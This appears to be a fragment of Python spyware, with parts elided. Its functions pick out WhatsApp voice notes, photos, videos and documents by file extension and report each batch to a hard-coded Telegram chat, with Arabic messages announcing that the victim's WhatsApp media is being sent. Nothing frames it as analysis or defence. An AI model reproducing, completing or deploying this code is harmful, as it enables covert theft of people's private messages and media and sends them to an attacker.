...
def send_voice(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".opus",".mp3", ".aac")):
            bot.send_message(chat_id=7477381053, text= 'جاري ارسال صوتيات الواتس اب 🔥😈')
...
def send_phot(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_message(chat_id=7477381053, text= 'جاري ارسال صور الواتساب 🔥😈')
...
def send_video(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_message(chat_id=7477381053, text= 'جاري ارسال فيديوهات الواتساب 🚀😈')
...
def send_doc(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf",".doc", ".text", ".pat")):
            bot.send_message(chat_id=7477381053, text= 'جاري ارسال مستندات الواتس اب 🔥😈')
